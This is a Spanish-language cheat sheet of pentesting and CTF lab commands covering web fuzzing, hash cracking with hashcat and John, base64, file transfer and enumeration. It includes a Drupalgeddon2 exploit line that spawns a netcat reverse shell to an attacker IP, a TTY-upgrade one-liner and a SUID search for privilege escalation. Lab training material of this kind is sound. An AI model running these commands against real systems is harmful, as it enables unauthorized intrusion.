
# Comandos Útiles para Ciberseguridad, Pentesting y Hacking Ético

Esta documentación proporciona una colección de comandos útiles para diversas tareas en ciberseguridad, pentesting y hacking ético, incluyendo una breve descripción de su función.

## HTTP Requests y Fuzzing

### curl

Realiza peticiones HTTP para interactuar con servidores web.

```bash
curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum  # Obtiene el hash MD5 de un recurso web.
curl http://10.10.245.129/ -v  # Realiza una petición HTTP y muestra información detallada.
```

### ffuf

Realiza fuzzing en directorios y parámetros de aplicaciones web para descubrir vulnerabilidades.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.245.129/FUZZ  # Fuzzing de la URL con una lista de palabras.
```

### dirb, gobuster

Descubre directorios y archivos ocultos en servidores web mediante fuerza bruta.

```bash
dirb http://10.10.245.129/ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  # Busca directorios en el sitio web.
gobuster dir --url http://10.10.245.129/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  # Similar a dirb, pero con más opciones.
```

***

## Cracking y Hashing

### Hashcat

Descifra hashes de contraseñas utilizando diferentes métodos (diccionario, fuerza bruta, etc.).

```bash
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt  # Descifra un hash MD5 con sal usando un diccionario.
```

### Generar Hashes

Calcula hashes MD5 y SHA256 para verificar la integridad de archivos o datos.

```bash
echo -n "LearnTheHashFunction" | md5sum  # Calcula el hash MD5 de la cadena.
echo -n "ThisIsAMoreSecureHashFunction" | sha256sum  # Calcula el hash SHA256 de la cadena.
echo -n "ThisIsAMoreSecureHashFunction" | sha256sum | awk '{printf $1}' | md5sum  # Calcula el hash MD5 del hash SHA256.
```

### John the Ripper

Descifra hashes de contraseñas utilizando diferentes formatos y diccionarios.

```bash
john --format=drupal7 --wordlist=/usr/share/wordlists/rockyou.txt ~/CTFs/VulnHub/DC-1/admin_hash.txt  # Descifra un hash de Drupal 7 usando un diccionario.
```

***

## Base64

### Codificación y Decodificación Base64

Codifica datos binarios en texto ASCII para facilitar su transmisión.

```bash
base64 -d base64-c6d8efd649ad94af23eb2bd2af63edd0.txt  # Decodifica una cadena Base64.
echo -n "recuerdaquebase64NOescifrar" | md5sum  # Muestra que Base64 no cifra, solo codifica.
# Resultado: cf9df460535b4ec175a464c6c120d3fe
```

***

## Scripting

### Script de Git en Bash

Automatiza comandos de Git para la gestión de versiones.

```bash
#!/bin/bash

# Cambia al directorio deseado
cd 'C:\Users\renek\OneDrive\Documentos\P Y T  H O N\'

# Ejecuta comandos de Git
git add .
git commit -m 'Update changes from PC'
git push origin main --force
```

***

## Reverse Shell

### Atacante

Establece una reverse shell utilizando una vulnerabilidad en Drupal y netcat.

```bash
python2 drupalgeddon2.py -h http://10.0.2.5 -c 'nohup nc -e /bin/bash 10.0.2.15 9000 &'  # Explota la vulnerabilidad y establece la conexión.
```

### Objetivo

Escucha conexiones entrantes con netcat para recibir la shell.

```bash
nc -lnvp 9000  # Escucha en el puerto 9000.
```

***

## Enumeración

### Buscar archivos SUID

Identifica archivos con permisos SUID que pueden permitir la elevación de privilegios.

```bash
find / -perm -u=s 2>/dev/null  # Busca archivos con el bit SUID activado.
```

### WhatWeb

Identifica tecnologías utilizadas en un sitio web para identificar posibles vectores de ataque.

```bash
whatweb <ip> | awk '{gsub(/], /, "],\n" ); print}'  # Escanea el sitio web y formatea la salida.
```

***

## Manipulación de Archivos

### Mostrar contenido de archivo

```bash
cat archivo.txt
```

### Codificar archivo en Base64

```bash
cat archivo.txt | base64
```

### Decodificar Base64

```bash
echo "cGFsbGFiaHJhcw==" | base64 -d
```

### Calcular hash MD5 de archivo

```bash
md5sum archivo.txt
```

### Calcular hash SHA-256 de archivo

```bash
sha256sum archivo.txt
```

***

## Descarga de Archivos (Wget)

### wget

Permite descargar archivos desde la web a través de HTTP.

```bash
wget https://ejemplo.com/archivo.txt  # Descarga un archivo específico
wget -O nuevo_nombre.txt https://ejemplo.com/archivo.txt  # Guarda el archivo con otro nombre
wget -r -np -nH https://ejemplo.com/directorio/  # Descarga recursivamente un directorio
```

***

## Transferencia de Archivos con SCP (SSH)

### scp

Permite copiar archivos de forma segura entre dos sistemas usando el protocolo SSH.

```bash
scp archivo.txt usuario@192.168.1.30:/home/usuario/destino.txt  # Copia un archivo a un sistema remoto
scp usuario@192.168.1.30:/home/usuario/archivo.txt ./  # Copia un archivo desde un sistema remoto al actual
scp -r directorio usuario@192.168.1.30:/home/usuario/  # Copia un directorio completo a un sistema remoto
```

***

## Servidor Web Simple (Python)

### Iniciar un servidor HTTP

```bash
python3 -m http.server
python3 -m http.server 8080
python3 -m http.server --directory /ruta/del/directorio/
```

***

## Acceso a un Bash del Sistema con Meterpreter

### Obtener acceso a un bash del sistema a través de Meterpreter

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

***

## Fuerza Bruta y Análisis de Directorios

### ffuf

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.245.129/FUZZ
```

### dirb

```bash
dirb http://10.10.245.129/ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

### gobuster

```bash
gobuster dir --url http://10.10.245.129/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

***

## Análisis de Malware e IPs

### Defanging de una IP o URL

Transforma direcciones para evitar ejecuciones accidentales. Ejemplo:

```bash
204[.]93[.]183[.]11
```

### Generar un hash SHA-256 para analizar malware

```bash
sha256sum <nombre_del_archivo>
```
